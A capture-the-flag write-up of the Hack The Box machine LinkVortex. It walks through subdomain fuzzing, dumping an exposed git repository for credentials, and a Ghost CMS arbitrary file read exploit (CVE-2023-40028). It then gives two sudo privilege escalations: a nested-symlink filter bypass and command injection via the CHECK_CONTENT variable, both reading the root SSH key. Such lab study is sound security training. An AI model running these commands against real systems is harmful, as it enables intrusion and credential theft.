---
title: linkvortex
layout: post
released: 2024-12-07
creators: 0xyassine
pwned: true
tags: 
  - os/linux
  - diff/easy
category:
  - HTB
summary: Link vortex is running a webserver using ghost cms which we can find the credentials of in the git repository of a subdomain. We utilize a ghost cms exploit that uses symlinks to read files for the configuration of ghost which nets us the credentials of user Bob. Bob has the permissions to run a custom script as sudo which reads and transfers symlinks with some filtering. We can bypass the filtering through a double symlink. Another way we can escalate privileges is through exploiting a vulnerbility in the script that allows code execution through injection via the CHECK_CONTENT variable. Neither of these methods are intended and the intended method is to just fight the race condition right after the symlink is moved but before it is read to get another arbitrary file read.
image: https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png
cssclass: custom_htb
---
![HTB](https://labs.hackthebox.com/storage/avatars/97f12db8fafed028448e29e30be7efac.png)
# Information Gathering
## Enumeration
As always we start off with a port scan.
```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 3ef8b968c8eb570fcb0b47b9865083eb (ECDSA)
|_  256 a2ea6ee1b6d7e7c58669ceba059e3813 (ED25519)
80/tcp open  http    Apache httpd
| http-robots.txt: 4 disallowed entries
|_/ghost/ /p/ /email/ /r/
|_http-generator: Ghost 5.58
|_http-title: BitByBit Hardware
|_http-server-header: Apache
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Looking at the scan we notice the interesting disallowed entry: `/ghost`
# BitByBit Hardware website
When visiting the webserver we're greeted by a website that talks about computer parts.
![](/assets/img/img_linkvortex/linkvortex-1744530221901.png)
When scrolling to the bottom we can see that it's using `ghost cms`, the sign up button does nothing.
![](/assets/img/img_linkvortex/linkvortex-1744530262452.png)
All the posts are written by `admin`
![](/assets/img/img_linkvortex/linkvortex-1744530316390.png)
There's nothing too interesting to look at here so let's start fuzzing.
```bash
ffuf -u http://linkvortex.htb -H "HOST: FUZZ.linkvortex.htb" -w `fzf-wordlists` -fc 301

        / ___\  / ___\           / ___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb
 :: Wordlist         : FUZZ: /opt/lists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response status: 301
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 76ms]
:: Progress: [4989/4989] :: Job [1/1] :: 1169 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```
Fuzzing for subdomains, we notice `dev.linkvortex.htb`
![](/assets/im/assets/img/img_linkvortex/linkvortex-1744530479042.png)
We're greeted by a Launching Soon banner and nothing interesting.
Let's do a simple script scan on this subdomain.
```bash
 nmap -sC -sV -p 80 dev.linkvortex.htb
Starting Nmap 7.93 ( https://nmap.org ) at 2025-04-13 17:48 AEST
Nmap scan report for dev.linkvortex.htb (10.10.11.47)
Host is up (0.033s latency).
rDNS record for 10.10.11.47: linkvortex.htb

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd
| http-git:
|   10.10.11.47:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/TryGhost/Ghost.git
|_http-title: Launching Soon
|_http-server-header: Apache
```
We find a git repository, let's dump this with `git-dumper`
```bash
git-dumper $TARGET/.git ./git-dump/
[-] Testing http://dev.linkvortex.htb/.git/HEAD [200]
[-] Testing http://dev.linkvortex.htb/.git/ [200]
[-] Fetching .git recursively
[-] Fetching http://dev.linkvortex.htb/.gitignore [404]
[-] http://dev.linkvortex.htb/.gitignore responded with status code 404
[-] Fetching http://dev.linkvortex.htb/.git/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/packed-refs [200]
[-] Fetching http://dev.linkvortex.htb/.git/config [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/index [200]
[-] Fetching http://dev.linkvortex.htb/.git/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/description [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/shallow [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/logs/HEAD [200]
[-] Fetching http://dev.linkvortex.htb/.git/info/exclude [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/applypatch-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/ [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/fsmonitor-watchman.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/post-update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-applypatch.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-push.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-merge-commit.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/prepare-commit-msg.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-rebase.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/pre-receive.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/push-to-checkout.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/hooks/update.sample [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/e6/54b0ed7f9c9aedf3180ee1fd94e7e43b29f000 [200]
[-] Fetching http://dev.linkvortex.htb/.git/refs/tags/v5.57.3 [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/50/864e0261278525197724b394ed4292414d9fec [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.idx [200]
[-] Fetching http://dev.linkvortex.htb/.git/objects/pack/pack-0b802d170fe45db10157bb8e02bfc9397d5e9d87.pack [200]
[-] Sanitizing .git/config
[-] Running git checkout .
Updated 5596 paths from the index
```
Let's look at the recent changes made.
```diff
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {

         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45G';

             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')
```
We notice a clear text password: `OctopiFociPilfer45`
Let's head on over to http://linkvortex.htb/ghost/ which will redirect to http://linkvortex.htb/ghost/#/signin where we are greeted by a login portal.
![](/assets/img/img_linkvortex/linkvortex-1744531054728.png)
Attempting the password using `test@example.com` fails however using the username `admin` and the email `@linkvortex.htb` works!
![](/assets/img/img_linkvortex/linkvortex-1744531108054.png)
We're greeted by the `ghost` cms dashboard!
# User
Looking around we find a version number: `5.58.0`
![](/assets/img/img_linkvortex/linkvortex-1744531148477.png)
Searching for vulnerabilities we found the following `poc` https://github.com/0xDTC/Ghost-5.58-Arbitrary-File-Read-CVE-2023-40028
Looking at the source it looks like it uploads a zipped file with a symlink to get an LFI.
Let's run this script against our target.
```bash
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /etc/passwd
File content:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
node:x:1000:1000::/home/node:/bin/bash
Enter the file path to read (or type 'exit' to quit): exit
Exiting. Goodbye!
```
We have an LFI! looking through the files from the git repository we dumped we can find `Dockerfile.ghost`
```bash
FROM ghost:5.58.0

# Copy the config
COPY config.production.json /var/lib/ghost/config.production.json

# Prevent installing packages
RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb

# Wait for the db to be ready first
COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
COPY entry.sh /entry.sh
RUN chmod +x /var/lib/ghost/wait-for-it.sh
RUN chmod +x /entry.sh

ENTRYPOINT ["/entry.sh"]
CMD ["node", "current/index.js"]
```
We can see a few interesting directories, the most interesting one being the config. Let's attempt to read this with our lfi.
```bash
./CVE-2023-40028 -u admin@linkvortex.htb -p OctopiFociPilfer45 -h http://linkvortex.htb
WELCOME TO THE CVE-2023-40028 SHELL
Enter the file path to read (or type 'exit' to quit): /var/lib/ghost/config.production.json
File content:
{
  "url": "http://localhost:2368",
  "server": {
    "port": 2368,
    "host": "::"
  },
  "mail": {
    "transport": "Direct"
  },
  "logging": {
    "transports": ["stdout"]
  },
  "process": "systemd",
  "paths": {
    "contentPath": "/var/lib/ghost/content"
  },
  "spam": {
    "user_login": {
        "minWait": 1,
        "maxWait": 604800000,
        "freeRetries": 5000
    }
  },
  "mail": {
     "transport": "SMTP",
     "options": {
      "service": "Google",
      "host": "linkvortex.htb",
      "port": 587,
      "auth": {
        "user": "bob@linkvortex.htb",
        "pass": "fibber-talented-worth"
        }
      }
    }
}
Enter the file path to read (or type 'exit' to quit):
```
We can find the credentials: `bob`:`fibber-talented-worth`. Let's attempt to ssh as `bob`.
```bash
ssh bob@linkvortex.htb
bob@linkvortex.htbs password:
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
bob@linkvortex:~$
```
Success! We have user.
# Root
Looking at our permissions it looks like we can run a custom script with a certain wildcard that limits our usage to a png file as a parameter.
```bash
sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
```
Looking at the script there's a bit of filtering for it.
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"
if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi
if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi
```
The way I see it there's 2 different vulnerabilities I found, both of wich unfortunately unintended.
## PrivEsc 1 : Links go brrrr
We can see there's some filtering with the links to ensure the `etc` and `root` directories aren't being linked. We can bypass this by nesting our links.
Let's first create a link to the root ssh key.
```
bob@linkvortex:~/w1ld$ ln -s /root/.ssh/id_rsa /home/bob/w1ld/ssh
bob@linkvortex:~/w1ld$ ls -la
total 8
drwxrwxr-x 2 bob bob 4096 Apr 13 08:30 .
drwxr-x--- 4 bob bob 4096 Apr 13 08:29 ..
lrwxrwxrwx 1 bob bob   17 Apr 13 08:30 ssh -> /root/.ssh/id_rsa
```
Next let's create a symlink to this file as a png.
```
bob@linkvortex:~/w1ld$ ln -s /home/bob/w1ld/ssh /home/bob/w1ld/w1ld.png
bob@linkvortex:~/w1ld$ ls -la
total 8
drwxrwxr-x 2 bob bob 4096 Apr 13 08:30 .
drwxr-x--- 4 bob bob 4096 Apr 13 08:29 ..
lrwxrwxrwx 1 bob bob   17 Apr 13 08:30 ssh -> /root/.ssh/id_rsa
lrwxrwxrwx 1 bob bob   18 Apr 13 08:30 w1ld.png -> /home/bob/w1ld/ssh
```
Now let's run the script ensuring `CHECK_CONTENT` is set to true.
```
bob@linkvortex:~/w1ld$ CHECK_CONTENT='true' sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
Link found [ w1ld.png ] , moving it to quarantine
Content:
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
<SNIP>
```
Copying this back to our attacking machine and setting the correct permissions allows us to ssh as root onto the machine.
```bash
ssh root@linkvortex.htb -i root_id_rsa
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Mon Dec  2 11:20:43 2024 from 10.10.14.61
-bash: warning: setlocale: LC_ALL: cannot change locale (en_US.UTF-8)
root@linkvortex:~#
```
## PrivEsc 2: Check Content Boogaloo
Looking back at the script it seems that if the symlink is valid it checks for `CHECK_CONTENT` directly within the shell.
```bash
else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
```
We can abuse this by setting `CHECK_CONTENT` as a command. For the purposes of demonstration I'll just be viewing the ssh key again.
```bash
bob@linkvortex:~$ ln -s /home/bob/user.txt w1ld.png
bob@linkvortex:~$ CHECK_CONTENT="cat /root/.ssh/id_rsa" sudo /usr/bin/bash /opt/ghost/clean_symlink.sh *.png
/opt/ghost/clean_symlink.sh: line 5: [: cat: binary operator expected
Link found [ w1ld.png ] , moving it to quarantine
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAmpHVhV11MW7eGt9WeJ23rVuqlWnMpF+FclWYwp4SACcAilZdOF8T
q2egYfeMmgI9IoM0DdyDKS4vG+lIoWoJEfZf+cVwaZIzTZwKm7ECbF2Oy+u2SD+X7lG9A6
V1xkmWhQWEvCiI22UjIoFkI0oOfDrm6ZQTyZF99AqBVcwGCjEA67eEKt/5oejN5YgL7Ipu
```
As we can see it executes the command and we can once again ssh as root.
## Intended Root
I was unable to find the intended root until the retirement of the box when I read [0xdf's Writeup](https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html#)
Apparently the intended route is to fight the race condition and swap the link over to something useful. 0xdf goes over this in detail [here](https://0xdf.gitlab.io/2025/04/12/htb-linkvortex.html#exploit-clean_symlinksh).